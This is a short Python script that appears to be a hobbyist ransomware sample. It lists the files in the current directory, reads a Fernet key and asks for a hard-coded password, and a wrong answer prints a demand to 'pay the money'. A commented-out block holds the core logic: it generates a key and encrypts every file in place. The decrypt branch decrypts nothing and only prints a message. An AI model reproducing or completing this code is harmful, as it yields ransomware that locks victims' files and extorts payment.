import os
from cryptography.fernet import Fernet
files = []
for file in os.listdir():

     if file=='ran.py' or file == 'seckey.key' or file =='decrept.py':
          continue
     if os.path.isfile(file):
         files.append(file)
         with open("seckey.key","rb" ) as k :
              secretkey=k.read()
         secret_phrase="shruti"  
         user_entry=input("enter the password to decrept the file")
         if user_entry==secret_phrase:
               print("great file decrept")
         else:
               print("wrong password , to drecept pay the money")



##key=Fernet.generate_key()
##print(key)
##with open("seckey.key","wb" ) as k :
   ##  k.write(key)
#for file in files:
   # with open(file,'rb') as theFile:
               #content = theFile.read()
               #encrypted_content=Fernet(key).encrypt(content)   
               #with open(file,'wb') as theFile:
                   # theFile.write(encrypted_content)